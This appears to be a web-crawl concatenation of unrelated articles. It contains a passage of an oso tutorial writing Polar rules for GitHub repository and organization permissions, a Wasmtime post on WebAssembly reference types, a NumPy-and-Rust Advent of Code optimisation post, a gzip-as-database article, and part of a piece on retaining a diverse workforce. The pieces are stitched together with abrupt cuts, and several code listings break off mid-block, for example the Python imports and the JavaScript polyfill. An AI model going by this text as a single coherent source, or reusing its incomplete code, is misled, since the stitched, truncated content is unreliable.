<strong>allow</strong> rules to the policy later on.</p><p>One other thing to note about these rules: the {% c-line %}User{% c-line-end %} and {% c-line %}Repository{% c-line-end %} types specified for actors and resources refer to the object types actually used in the GitHub application code. </p><p>oso makes it possible to pass <a href="https://docs.osohq.com/getting-started/policies/application-types.html" target="_blank">application objects</a> directly into the policy evaluation engine.</p><p>As mentioned earlier, there's another type of user that can access repositories owned by user accounts—collaborators. Repository owners can invite collaborators to a repository. We can access a repository's collaborators with the {% c-line %}.collaborators{% c-line-end %} field; each collaborator has an {% c-line %}id{% c-line-end %} field and a {% c-line %}permission{% c-line-end %} field, which we can use in our policy:</p><p>{% c-block language="polar" %}<br># Look up an actor's permission level from the repository's collaborator list.<br>permission(actor: User, role, resource: Repository) if	<br>&nbsp;&nbsp;&nbsp;&nbsp;collab in resource.collaborators and	<br>&nbsp;&nbsp;&nbsp;&nbsp;actor.id = collab.id and	<br> &nbsp;&nbsp;&nbsp;role = collab.permission;<br>{% c-block-end %}</p><h4>A quirk about GitHub permissions</h4><p>As we've seen, the permissions on user-account-owned repositories are pretty basic and coarse. The next level of complexity in the GitHub authorization model is Organizations. As you might already know, GitHub repositories can also be owned by <strong>organization accounts.</strong> And it turns out that the permissions work quite differently with organizations than with user accounts. But let's see if we can use oso to add organizations with as few changes as possible.</p><h3>Organizations</h3><figure id="w-node-7ccfaf29303c-8e3b6817"><p><img src="https://uploads-ssl.webflow.com/5f1483105c9a72fd0a3b662a/5f467d32ecc6f33537857cf3_Screen_Shot_2020-08-26_at_11.16.43_AM.png" alt=""></p></figure><p>GitHub organizations have three user types:</p><ul role="list"><li>Owners</li><li>Billing managers</li><li>Members</li></ul><p>We're going to focus on owners and members. Like repository owners, organization owners can take any action on the organization.</p><div><p>{% c-block language="polar" %}<br>allow(actor: User, _action, resource: Organization) if	<br>&nbsp;&nbsp;&nbsp;&nbsp;role(actor, "OWNER", resource);</p><p># Rule specifying organization ownership.<br># Note that using the `Organization` specializer prevents it <br># from conflicting with our rule for repository ownership. <br>role(actor: User, "OWNER", resource: Organization) if	<br>&nbsp;&nbsp;&nbsp;&nbsp;member in resource.membersWithRole and	<br>&nbsp;&nbsp;&nbsp;&nbsp;member.role = "ADMIN" and	<br>&nbsp;&nbsp;&nbsp;&nbsp;member.id = actor.id;</p><p>role(actor: User, "MEMBER", resource: Organization) if	<br>&nbsp;&nbsp;&nbsp;&nbsp;member in resource.membersWithRole and	<br>&nbsp;&nbsp;&nbsp;&nbsp;member.id = actor.id;<br>{% c-block-end %}</p></div><p>Notice that the logic for defining organization owners is different from the logic for defining repository owners. Organizations do not have an {% c-line %}owner{% c-line-end %} field (there can be multiple owners). Instead, organizations store owners in the {% c-line %}.membersWithRole{% c-line-end %} field, along with every other organization member. GitHub distinguishes owners from other members by giving them a role called {% c-line %}"ADMIN"{% c-line-end %} (not to be confused with the {% c-line %}"ADMIN"{% c-line-end %} permission level for repositories). Normal members simply have the {% c-line %}"MEMBER"{% c-line-end %} role.</p><p>If you didn't get all that, not to worry. All you really need to know is that this logic reflects our best approximation of how the data would actually be stored in GitHub's application, which is why it looks a little strange.</p><p>We can now use the role rules we've written to specify permissions for repositories within organizations. Org members can have any of the following permission levels for a repository in an organization:</p><ul role="list"><li>Read</li><li>Triage</li><li>Write</li><li>Maintain</li><li>Admin</li></ul><p>Organization owners always have {% c-line %}"ADMIN"{% c-line-end %} permissions, for all repositories. This means that we now have two conditions that always give users {% c-line %}"ADMIN"{% c-line-end %} permissions on repositories: 1) if the user owns the repository, and 2) if the user owns the organization that owns the repository. The second condition can be enforced by adding one line to the existing rule for the {% c-line %}"ADMIN"{% c-line-end %} permission:</p><p>{% c-block language="polar" %}<br># Repository owners are admins of their own repositories. <br># Organization owners are admins of all organization repositories.<br>permission(actor: User, "ADMIN", resource: Repository) if<br>&nbsp;&nbsp;&nbsp;&nbsp;role(actor, "OWNER", resource) or<br>&nbsp;&nbsp;&nbsp;&nbsp;role(actor, "OWNER", resource.owner);<br>{% c-block-end %}<br></p><p>Owner permissions? Check. Let's move on to repository permissions for plain old members. GitHub offers two ways for members to gain repository access: <strong>base permissions</strong> and <strong>direct access</strong>. The base permission is the default repository permission given to all organization members:</p><p>{% c-block language="polar" %}<br># All organization members have access to repositories from the base role.<br>permission(actor: User, permission, resource: Repository) if<br>&nbsp;&nbsp;&nbsp;&nbsp;org = resource.owner and<br>&nbsp;&nbsp;&nbsp;&nbsp;org matches Organization { baseRole: permission } and<br>&nbsp;&nbsp;&nbsp;&nbsp;role(actor, "MEMBER", org);<br>{% c-block-end %}<br></p><p>Direct access refers to permissions given directly to members by admins of the repository. Members with direct access can be found in the repository's list of <strong>collaborators. </strong>Yes, collaborators! Remember those from earlier? The rule we already wrote for collaborator permissions will work for organization-owned repositories as well.</p><h3>Teams</h3><figure id="w-node-ffc27d927b9d-8e3b6817"><p><img src="https://uploads-ssl.webflow.com/5f1483105c9a72fd0a3b662a/5f467a2acf0c4d0967b0a6ff_Untitled.png" alt=""></p></figure><p>As a quick recap, our policy now depends on three permission sources for repository access: ownership, organization base permissions, and direct access (or collaboration). <em>And each new permission source required minimal, if any modifications to our existing rules.</em> This is one benefit of declarative policies and additive rules.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>A few week ago, I finished implementing support for <a href="https://github.com/WebAssembly/reference-types/blob/master/proposals/reference-types/Overview.md">the WebAssembly reference
types proposal</a> in Wasmtime. <a href="https://github.com/bytecodealliance/wasmtime/">Wasmtime</a> is a standalone,
outside-the-Web WebAssembly runtime, and the reference types proposal is
WebAssembly’s first foray beyond simple integers and floating point numbers,
into the exciting world of garbage-collected references. This article will
explain what the reference types proposal enables, what it leaves for future
proposals, and how it is implemented in Wasmtime.</p>

<h2 id="what-are-reference-types">What are Reference Types?</h2>

<p>Without the reference types proposal, WebAssembly can only manipulate simple
integer and floating point values. It can’t take or return references to the
host’s objects like, for example, a DOM node on a Web page or an open connection
on a server. There are workarounds: for example, you can store the host objects
in a side table and refere to them by index, but this adds an extra indirection
and implementing the side table requires cooperating glue code on the host
side. That glue code, in particular, is annoying because it is outside of the
Wasm sandbox, diluting Wasm’s safety guarantees, and it is host-specific. If you
want to use your Wasm module on the Web, in a Rust host, and in a Python host,
you’ll need three separate glue code implementations. This makes WebAssembly
less attractive as a universal binary format.</p>

<p>With the reference types proposal, you don’t need glue code to interact with
host references. The proposal has three main parts:</p>

<ol>
  <li>
    <p>A new <code>externref</code> type, representing an opaque, unforgable reference to a
host object.</p>
  </li>
  <li>
    <p>An extension to WebAssembly tables, allowing them to hold <code>externref</code>s in
addition to function references.</p>
  </li>
  <li>
    <p>New instructions for manipulating tables and their entries.</p>
  </li>
</ol>

<p>With these new capabilities, Wasm modules can talk about host references
directly, rather than requiring external glue code running in the host.</p>

<p><code>externref</code>s play nice with WebAssembly’s sandboxing properties:</p>

<ul>
  <li>
    <p>They are <em>opaque</em>: a Wasm module cannot observe an <code>externref</code> value’s bit
pattern. Passing a reference to a host object into a Wasm module doesn’t
reveal any information about the host’s address space and the layout of host
objects within it.</p>
  </li>
  <li>
    <p>They are <em>unforgable</em>: a Wasm module can’t create a fake host reference out of
thin air. It can only return either a reference you already gave it or the
null reference. It <em>cannot</em> pretend like the integer value <code>0x1bad2bad</code> is a
valid host reference, return it to you, and trick you into dereferencing this
invalid pointer.</p>
  </li>
</ul>

<h2 id="example">Example</h2>

<p>Here’s a Wasm module that exports a <code>hello</code> function which takes, as an
<code>externref</code> parameter, a reference to an open file and writes “Hello, Reference
Types!” to the file. This module imports the <code>write</code> syscall from a hypothetical
future version of <a href="https://wasi.dev/">WASI</a>, the WebAssembly System Interface, that leverages
reference types.</p>

<div><div><pre><code><span>;; hello.wat</span>

<span>(</span><span>module</span>
  <span>;; Import the write syscall from a hypothetical (and</span>
  <span>;; simplified) future version of WASI.</span>
  <span>;;</span>
  <span>;; It takes a host reference to an open file, an address</span>
  <span>;; in memory, and byte length and then writes</span>
  <span>;; `memory[address..(address+length)]` to the file.</span>
  <span>(</span><span>import</span> <span>"future-wasi"</span> <span>"write"</span>
    <span>(</span><span>func</span> <span>$write</span> <span>(</span><span>param</span> <span>externref</span> <span>i32</span> <span>i32</span><span>)</span> <span>(</span><span>result</span> <span>i32</span><span>)))</span>

  <span>;; Define a memory that is one page in size (64KiB).</span>
  <span>(</span><span>memory</span> <span>(</span><span>export</span> <span>"memory"</span><span>)</span> <span>1</span><span>)</span>

  <span>;; At offset 0x42 in the memory, define our data string.</span>
  <span>(</span><span>data</span> <span>(</span><span>i32.const</span> <span>0x42</span><span>)</span> <span>"Hello, Reference Types!\n"</span><span>)</span>

  <span>;; Define a function that writes our hello string to a</span>
  <span>;; given open file handle.</span>
  <span>(</span><span>func</span> <span>(</span><span>export</span> <span>"hello"</span><span>)</span> <span>(</span><span>param</span> <span>externref</span><span>)</span>
    <span>(</span><span>call</span> <span>$write</span>
      <span>;; The open file handle we were given.</span>
      <span>(</span><span>local.get</span> <span>0</span><span>)</span>
      <span>;; The address of our string in memory.</span>
      <span>(</span><span>i32.const</span> <span>0x42</span><span>)</span>
      <span>;; The length of our string in memory.</span>
      <span>(</span><span>i32.const</span> <span>24</span><span>))</span>
    <span>;; Ignore the return code.</span>
    <span>drop</span><span>))</span>

<p>This Wasm module will run in <em>any</em> WebAssembly environment where WASI is
available.<sup id="back-ref-wasi-available"><a href="#foot-ref-wasi-available">0</a></sup> We don’t need glue code that is
maintaining a side table, mapping host references to indices.</p>

<h3 id="python">Python</h3>

<p>For example, we can run <code>hello.wat</code> from <a href="https://github.com/bytecodealliance/wasmtime-py/">a Python host
environment</a> without any glue code:</p>

<p>Running <code>hello.wat</code> — once again, without module-specific glue code
— is just as easy in <a href="https://github.com/bytecodealliance/wasmtime-dotnet/">.NET</a> and <a href="https://github.com/bytecodealliance/wasmtime-go">Go</a> host
environments, and is left as an exercise for the reader ;)</p>

<h3 id="on-the-web">On the Web</h3>

<p>Unlike the other host environments we’ve considered, WASI isn’t natively
implemented on the Web. There’s nothing stopping us, however, from polyfilling
WASI APIs with a little bit of JavaScript and a couple DOM methods! This is
still an improvement because there is overall less module-specific glue
code. Once one person has written the polyfills, everyone’s Wasm modules can
reuse them.</p>

<p>There are many different things an “open file” could be modeled by on the
Web. For this demo, we’ll use a DOM node: writing to it will append text
nodes. This works well because we know our module is only writing text data. If
we were working with binary data, we would choose another polyfilling approach,
like in-memory array buffers backing the file data.</p>

<p>Here is the JavaScript code to run our <code>hello.wat</code> module and polyfill our
<code>future-wasi.write</code> function:</p>

<div><div><pre><code><span>// The DOM node we will use as an "open file".</span>
<span>const</span> <span>output</span> <span>=</span> <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>"</span><span>output</span><span>"</span><span>);</span>

<p>You can view a live demo of this code in the iframe below. It should work in
Firefox 79+, or any other browser that supports reference types (at the time of
writing, Chrome has support for an older version of the reference types proposal
behind the <code>--experimental-wasm-anyref</code> flag, and Safari has in-progress support
behind the <code>JSC_useWebAssemblyReferences</code> flag.)</p>



<h2 id="what-comes-after-the-reference-types-proposal">What Comes After the Reference Types Proposal?</h2>

<p>The in-progress <a href="https://github.com/WebAssembly/proposal-type-imports/blob/master/proposals/type-imports/Overview.md">WebAssembly type imports proposal</a> builds on
reference types to let you distinguish between different kinds of host objects:
database connections and open files would be separate types. Or, on the Web,
Wasm would distinguish JavaScript <code>Promise</code>s from DOM nodes. It also adds
references that point to types defined by other Wasm modules, not just host
objects.</p>

<p>WASI will want to adopt unforgable reference types for file handles, as the
examples above suggest, instead of using integers. It might make sense for WASI
to wait for type imports, however, so it can use separate types for, say, an
open file and a source of entropy. This is a decision for the WASI subgroup of
the WebAssembly Community Group. Either way, when WASI does make this switch, it
will continue to support integer file descriptors, but implemented inside the
Wasm sandbox as indices into an <code>externref</code> Wasm table.</p>

<p>The <a href="https://github.com/WebAssembly/interface-types/blob/master/proposals/interface-types/Explainer.md">interface types</a> and <a href="https://github.com/WebAssembly/module-linking/blob/master/proposals/module-linking/Explainer.md">module linking</a> proposals promise to remove even more
glue code and bindings. The interface …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"> <p>This is a quick post about optimizing algorithms written in Python with NumPy, and implementing the same code in Rust. We’re going to take a look at one of the <a href="https://adventofcode.com/">Advent of Code</a> challenges, solve it, optimize it with NumPy, and then <a href="#writing-it-in-rust">write both of our solutions in Rust</a>.</p> <p>If you’re unfamiliar with Advent of Code, it’s an advent calendar of programming related puzzles which has run each December since 2015. Every day from December 1st until the 25th, a new challenge is posted and you’re encouraged to submit a solution.</p> <h2 id="analyzing-the-challenge">Analyzing the Challenge</h2> <p>Let’s take a look at <a href="https://adventofcode.com/2018/day/3">AoC’s Day 3 challenge</a>.</p> <p>This problem requires us to count the number of overlapping claims in a given area. That area, which is the fabric in the challenge, can be represented by a 2-dimensional array of zeros in a naive solution to this problem.</p> <p>Every item in the 2-dimensional array will keep a count of how many claims take ownership of that item.</p> <p>Each claim can be thought of as another smaller 2-dimensional array of ones that we add to the larger 2-dimensional array. When we are finished, we can count how many items in the larger 2-dimensional array are greater than 1. Those items will represent the square inches of fabric that belong to more than one claim.</p> <h2 id="pure-python-solution">Pure Python Solution</h2> <p>Here’s a solution written in Python. While in the above analysis I said that we can think of each claim as being a 2-dimensional array of ones that we’ll add to the greater 2-dimensional array, our implementation will differ.</p> <p>We’ll iterate over the Cartesian coordinates of each claim and add <code>1</code> to the corresponding item in the greater 2-dimensional array.</p> <div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>NamedTuple</span><span>,</span> <span>List</span>

Vectorized functions <a href="https://en.wikipedia.org/wiki/Array_programming">work over entire arrays</a> and, if the underlying hardware supports it, can take advantage of <a href="https://en.wikipedia.org/wiki/SIMD">SIMD instructions</a>.</p> <p>SIMD stands for <strong>s</strong>ingle <strong>i</strong>nstruction, <strong>m</strong>utiple <strong>d</strong>ata. SIMD instructions allow us to apply an instruction over multiple points of data at the same time. They implement <a href="https://en.wikipedia.org/wiki/Data_parallelism">parallelism at the data-level</a>.</p> <div> <p><img src="https://d33wubrfki0l68.cloudfront.net/fc720ca43152233f93a18556facee9a11ecf9fa9/d7bf0/assets/imgs/posts/simd.svg" loading="lazy"> </p>  </div> <p>Examples of SIMD instructions are <a href="https://en.wikipedia.org/wiki/MMX_(instruction_set)">MMX</a>, <a href="https://en.wikipedia.org/wiki/Streaming_SIMD_Extensions">SSE/SSE2/SSE3/SSE4</a> and <a href="https://en.wikipedia.org/wiki/Advanced_Vector_Extensions">AVX</a> instruction sets on <a href="https://en.wikipedia.org/wiki/X86">x86 processors</a> and <a href="https://en.wikipedia.org/wiki/ARM_architecture#Advanced_SIMD_(Neon)">NEON instruction sets</a> on <a href="https://en.wikipedia.org/wiki/ARM_architecture">ARM processors</a>.</p> <p>When all that’s said and done, there’s no guarantee that NumPy will use SIMD instructions in our program. However, we’ll still benefit from a performance boost, because <a href="https://en.wikipedia.org/wiki/NumPy#Features">NumPy is built upon natively compiled and architectually efficient data structures and operations</a>.</p> <p>I have several clustered <a href="https://en.wikipedia.org/wiki/ARM7">ARMv7</a> machines. In the past, NumPy wasn’t optimized for ARM’s NEON instruction set in the same way that it’s optimized for x86 processors with <a href="https://github.com/numpy/numpy/search?q=sse&amp;unscoped_q=sse">SSE</a> and <a href="https://github.com/numpy/numpy/search?q=avx&amp;unscoped_q=avx">AVX</a> instructions. <a href="https://gcc.gnu.org/onlinedocs/gcc/ARM-Options.html">GCC’s ability to optimize NumPy at compile time will take advantage of NEON</a>, although in a more generalized fashion.</p> <p>Then, in late 2019, <a href="https://github.com/numpy/numpy/blob/5eff78bb16df99ffe2e9cad86c4ec649893c0646/doc/neps/nep-0038-SIMD-optimizations.rst">NumPy received some new NEON optimizations</a>.</p> <p>Even when NumPy wasn’t optimized for NEON, I still saw a performance increase when using NumPy instead of pure Python.</p> <h3 id="optimizing-our-solution">Optimizing Our Solution</h3> <p>In our previous solution, <code>get_fabric()</code> and <code>count_overlapping()</code> are sequential functions. That is to say that we apply an operation to each item in the array sequentially: we increment the first element in the array, then the next element and so on.</p> <p>To optimize our solution, we’ll need to use something beyond just pure Python.</p> <p>NumPy is a Python wrapper over lower-level C and Fortran code that implements optimized and natively compiled routines, so we’ll use that.</p> <p>Here, we’ll use NumPy’s <code>add()</code> vectorized <code>ufunc</code> instead of sequentially adding one to each item in the <code>fabric</code> array.</p> <div><div><pre><code><span>import</span> <span>numpy</span> <span>as</span> <span>np</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This article demonstrates how specially crafted but ordinary gzip archives can be used as a database like storage. It also introduces a <a href="https://github.com/ProfoundNetworks/gzipi">Python package</a> and explains how it works.</p><p><a href="https://en.wikipedia.org/wiki/Gzip">gzip</a> is a popular file compression format to store large amounts of raw data. It has a good data compression ratio, but relatively slow compression/decompression speed.</p><p>Many companies use it in Big data applications when they need to store compressed CSV or JSON lines files. Such file formats are <strong>row-oriented</strong> and usually processed line by line. gzip can save a lot of space, especially when you have repetitive field names in JSON files.</p><p>Unfortunately, a compressed file can only be accessed in the streaming fashion. Even if you have a sorted file and you know that you don't need the first half of the file — you can't jump to an arbitrary point in a file without starting decompressing it from the start of the file.</p><h2>gzip format</h2><p>A single gzip archive can only contain one file. Any gzip file starts with a magic number (1f 8b) followed by a 10-byte header that contains metadata. After the header, it contains compressed data followed by CRC32 checksum and the size of the original file.</p><p>The most interesting detail about the format is that gzip <a href="https://tools.ietf.org/html/rfc1952">RFC</a> allows multiple compressed files to be concatenated into a single file. Since gzip only allows to compress one file, multiple concatenated archives will still produce one file when decompressing.</p><p>Here is how two concatenated gzip files look like:</p><p><img src="https://rushter.com/static/uploads/img/gzip/multiple.svg" width="150"></p><p>You can think of it as concatenating two txt files. The final file will have content from both files. To combine multiple compressed files, you can use the <code>cat</code> command from GNU tools.</p><div><pre><span></span><code>$ <span>echo</span> <span>'123'</span> <span>|</span> gzip &gt; <span>1</span>.txt.gz
$ <span>echo</span> <span>'456'</span> <span>|</span> gzip &gt; <span>2</span>.txt.gz
$ cat <span>1</span>.txt.gz <span>2</span>.txt.gz &gt; <span>3</span>.txt.gz
$ zcat <span>3</span>.txt.gz
<span>123</span>
<span>456</span>
</code></pre></div><p>The <code>zcat</code> command is an alias to <code>gunzip -c</code>.</p><h2>Semi-random access</h2><p>An ability to concatenate multiple archives is a very handy property. By exploiting this feature and trading a little bit of speed and disk space, we can achieve semi-random access. By random access, I mean the ability to read an arbitrary offset of data from a file without reading the whole file.</p><p>To implement semi-random access, we need to split our uncompressed input into small chunks and compress them separately. We can chunk it by the number of lines. We can also chunk it by the number of bytes rounded to the nearest line end.</p><p>Let's suppose we have 1TB of JSON lines data that contains 10M of HTML webpages from <a href="https://commoncrawl.org/">Common Crawl</a> (CC). Since it takes a lot of space, we want to compress our data. When our dataset is compressed, it only takes around 180GB, which is <strong>six times</strong> less than storing uncompressed data. HTML data have a lot of repetitive tags, and they can be compressed pretty efficiently.</p><p>We also want to have random access to be able to sample smaller subsets of data without reading the whole archive. To do so, we can chunk (partition) our input by 10-100 lines and make a gzip archive from each chunk. We can do this on the go and append all the compressed chunks on the go to a single file.</p><p>Since our gzip archive is now chunked, we can jump to a random position in a file and search for the nearest gzip block. As we already know, each gzip file starts with a magic number and a specially defined header, so it's possible to locate each chunk's start.</p><p>To be able to perform line-level random access, we can chunk our input by one line. That is, we can make a separate archive from each line of our input. This gives us better random access but comes with a cost.</p><p>An empty gzip archive takes 20 bytes of space. If your lines are very short, gzipping each line can make a compressed file even bigger than the original input.</p><h2>gzip file as a database</h2><p>If each row in your data has a unique key, you can index it for faster lookups. For example, each row in our Common Crawl data has a domain name as a primary key. The <a href="https://en.wikipedia.org/wiki/Primary_key">primary key</a> length is relatively short compared to the content of the other fields (HTML and HTTP headers).</p><p>Since we already chunk our data, we can keep the start of the gzipped chunk for each of our primary keys. Primary keys are usually short, and we can store such information in a separate uncompressed txt file. This will be our index.</p><p>Gzipped files contain binary data. Thus, we need to keep the byte offset:</p><div><pre><span></span><code>domain_name|byte_offset_start
</code></pre></div><p>If the number of chunks is large, you can also store the line start (local character offset) inside the gzipped archive. This allows us to jump a particular line quickly. For additional speed gains, we can also keep offset size or offset end.</p><div><pre><span></span><code>domain_name|gzip_byte_offset_start|gzip_byte_offset_end|char_offset_start|char_offset_end
</code></pre></div><p>Every modern file-system supports random access and allows us to read an arbitrary offset of a file. Given a row from our index file, we can first jump to our specific gzip chunk. After locating it, we can decompress it on the go and skip first n characters until we hit the start of the line that we need to retrieve.</p><p>Given the index line, we can retrieve any row in <strong>almost</strong> <strong>constant time</strong>. When using an SSD storage, searching for a single line on 200GB of compressed Common Crawl data takes less than 0.1 seconds.</p><p>The plaintext index for 10 million domains takes around 500MB of disk space, which is nothing compared to the size of HTML data.</p><h2>Binary search</h2><p>Fast lookups sound very interesting, but searching for a specific key in the index file takes time too. For the CC use case, we need an ability to quickly find an arbitrary domain name in our index file.</p><p>The <a href="https://en.wikipedia.org/wiki/Binary_search_algorithm">binary search</a> algorithm can be very handy for this problem. All we need to do is to sort our index file by the key. We don't need to load the index file in memory, because we can use random access to jump to specific lines of the uncompressed file.</p><p>This article is already pretty long, so I won't get into details of how binary search works. It's a very fast algorithm, and it takes around 20 jumps on average to find the domain name in 10M of rows. If you haven't heard about it, you can have a look at a <a href="http://www.cs.armstrong.edu/liang/animation/web/BinarySearch.html">visualization</a>.</p><p>The main idea of the algorithm is to split the available data in half on each iteration and check the key in the middle. Since all data is sorted, we can quickly locate the primary key by knowing which side to keep and split next.</p><p>When everything is combined, the complete search system takes <strong>less than 0.3 seconds</strong> to search in the 1TB of compressed data.</p><p>I came up with this idea with <a href="https://github.com/mpenkov">Michael Penkov</a>, and we use such an approach for real tasks. We also wrote a <a href="https://github.com/ProfoundNetworks/gzipi">Python package</a> called <code>gzipi</code>, and the <a href="https://github.com/ProfoundNetworks/gzipi/blob/master/gzipi/lib.py">whole implementation</a> takes less than 1k of lines when using GNU tools (such as <code>cat</code>, <code>sort</code>, and <code>gzip</code>). The code is easy to learn and understand.</p><h2>How to use gzipi</h2><p>To start using gzipi, you need to have Python and <code>pip</code> installed on your system:</p><p>Please note that you also need GNU tools on your system. It works on Linux and macOS without any problems.</p><p>After installation, you can repack your existing gzip file:</p><div><pre><span></span><code><span>$</span> gzipi repack -f websites.json.gz -i index.gzi -o websites_repacked.json.gz --format json --field domain
</code></pre></div><p>The <code>field</code> argument specifies primary key. The input format could be <code>csv</code> or <code>json</code>.</p><p>Now you can search for an arbitrary key:</p><div><pre><span></span><code><span>$</span> gzipi search --input-file websites_repacked.json.gz --index-file index.gzi --key google.com
</code></pre></div><h2>S3 support and cost savings</h2><p>One of our requirements was to support S3 as a storage for our compressed files. Fortunately, S3 allows reading arbitrary offsets, so we don't need to store compressed files locally. Since binary search takes most of the time, storing index files locally significantly speeds up the search.</p><p>If you have gzipped JSON lines files, <a href="https://aws.amazon.com/athena/">Amazon athena</a> provides a solution to query them using SQL syntaxis. It's a very convenient solution, but Amazon charges $5 per T.B. of data scanned. Using Amazon's solution would potentially cost us <strong>thousands</strong> of dollars per month, and our solution cost us almost nothing because reading data from S3 from the same region is free.</p><h2>Possible improvements</h2><p>There are many ways to improve the search even more. Them main benefit of our solution is that it does not require a third-party database and takes very little RAM.</p><p>Instead of using the binary search algorithm, you can use B-tree or MARISA-trie structures. To use them, you need to store the index file in memory.</p><p>Instead of storing keys (domain names) in a file, you can also use hash tables, but that requires storing intermediate gzip files when compressing the data. When using hash tables, you don't need to store domain names. The only thing that is required is the start of the gzip chunk for each bucket.</p><h2>Afterword</h2><p>It took me a few days to implement an initial solution to our problem, and when I was writing it, we didn't know that there are similar solutions to query billions of webpages. As it turned out later, Common Crawl and Web Archive use pretty similar solutions. Common Crawl uses <a href="https://iipc.github.io/warc-specifications/specifications/warc-format/warc-1.0/">WARC</a> files to store HTTP responses, and each response is stored as a single gzip chunk. It also uses <a href="https://github.com/webrecorder/pywb">pywb</a> library that provides an <a href="https://index.commoncrawl.org/CC-MAIN-2020-34">API</a> and indexing capabilities.</p><p>Such an approach allows Common Crawl to query <strong>2.45 billion web pages</strong> without using a database. Since all CC data is on the S3, it also scales very well. Everyone that has access to S3 can query the data without talking to a centralized server.</p><p>The main difference is that our approach is focused on JSON and CSV files that contain much smaller sets of data (narrow data) on each row. Because of that, I use tens of thousands of rows per each gzip chunk.</p></div></div>]]>

Organizations have also seen their importance grow daily, steered by similar internal and external market forces. Many organizations have found themselves eager to embrace diversity to some degree, yet, many have found it difficult to implement and maintain a diverse workforce. Whether employees have demonstrated a lack of willingness to embrace change or availability of a diverse workforce is perceived to be dim, organizations have faced a multi-faceted challenge as they strive to gain the perceived benefits of ethnically diverse teams such as <a href="https://www.forbes.com/sites/rsmdiscovery/2018/08/22/why-workplace-diversity-is-so-important-and-why-its-so-hard-to-achieve/#13f1cb7a3096">higher innovation, greater opportunities with a broader clientele and higher profitability</a>.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Many organizations see diversity as an opportunity to bring different ideas, challenges, and solutions to their unique challenges because of the different experiences individuals accumulated throughout their life. Diverse teams are perceived to promote acceptance and, in turn, reduce discrimination. McKinsey &amp; Company – a global consulting firm – has gone a little further in their qualitative and quantitative analysis of the matter in their <a href="https://www.mckinsey.com/business-functions/organization/our-insights/why-diversity-matters">Why diversity matters (2015)</a>, <a href="https://www.mckinsey.com/business-functions/organization/our-insights/delivering-through-diversity">Delivering through diversity (2018)</a> and <a href="https://www.mckinsey.com/~/media/McKinsey/Featured%20Insights/Diversity%20and%20Inclusion/Diversity%20wins%20How%20inclusion%20matters/Diversity-wins-How-inclusion-matters-vF.pdf">Diversity wins: How inclusion matters (2020)</a> reports. One thing became clearer to them, highly diverse organizations have been outperforming their peers on average.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Despite the alleged benefits of having a diverse workforce, several organizations still struggle with attracting and retaining a diverse workforce. Several factors play an important role in this misalignment between goals (or objectives and policies) and actual implementation. These issues need to be addressed to ensure a healthy workplace that considers the needs of the workforce it wants to attract and maintain.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; This article will specifically focus on the retention of diverse employees. However, if you would like to read more about how to attract diverse employees, please see the article <a href="https://gpetrium.com/how-to-attract-a-diverse-workforce/"><em>How to Attract a Diverse Workforce</em></a>.</p></div></div></div><div data-id="565740a2" data-element_type="widget" data-widget_type="heading.default"><p><h2>How to Maintain a Diverse Workforce</h2></p></div><div data-id="6c5578dd" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; To maintain a diverse workforce, first there are a few internal items that organizations need to address. Such practices not only will increase the chances that persons from a diverse background want to apply to an organization, but also will increase the chances that they will continue working on the organization at a later stage.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Once enhancements have been done on <a href="https://gpetrium.com/how-to-attract-a-diverse-workforce/"><em>How to Attract a Diverse Workforce</em></a>, the organization needs to look inwards to understand the opportunities and challenges that it is likely to face as it expands diversity within its personnel. This activity may start with a couple of internal research on diversity to fuel strategic thinking and actionable goals as it strives to promote workforce engagement. Additionally, staff should be surveyed as they can provide valuable feedback on the company’s practices, culture and, on how both topics affect and incentive (or disincentive) diversity within the organization. As such, having a realistic picture of the state of diversity should be considered a first step in the journey to attract and maintain a diverse workforce.</p></div></div></div><div data-id="f23b5a5" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p><b>1) Inclusive Culture:</b> internal company culture plays an expansive role in workforce retention, especially among diverse hires. A culture in which discriminatory practices and ostracization prevail does not entice a friendly environment for individuals from minority groups. As such, it is important to promote diversity not only on paper, but also in practice by instilling policies that punish and disincentivize discriminatory behaviour and promote inclusiveness, so individuals feel safe and cared for. A culture that promotes a friendly tone of inclusivity which celebrates diversity is more conducive of a global workforce composed of different ethnic backgrounds, creeds, genders, and beliefs.<o:p></o:p></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.shrm.org/hr-today/news/hr-magazine/0418/pages/6-steps-for-building-an-inclusive-workplace.aspx">The Society for Human Resource Management (SHRM) provided valuable pointers on how to create and promote a culture of inclusiveness</a>. It all starts with training top-level executives on the importance of diversity and forming a dedicated council composed of diverse managers who will focus on implementing a strategy that promotes diversity and inclusion in the organization. Their approach also entails honouring employee’s diverse backgrounds and surveying employees on inclusiveness and diversity. As suggested by SHRM, it goes without saying that proper goal measuring and data gathering efforts should be made. Note that a dedicated council may not be viable to smaller organizations due to limited resource availability, in such cases, it remains possible to gather data on the workforce and to have at least two individuals sharing their thoughts on the available data.<o:p></o:p></p></div></div></div><div data-id="9073bf3" data-element_type="widget" data-widget_type="text-editor.default"><div><p><strong>2) Report on and celebrate workforce diversity: </strong>several workplaces report on diversity not only externally (<a href="https://www.mckinsey.com/about-us/diversity/overview">McKinsey</a>, <a 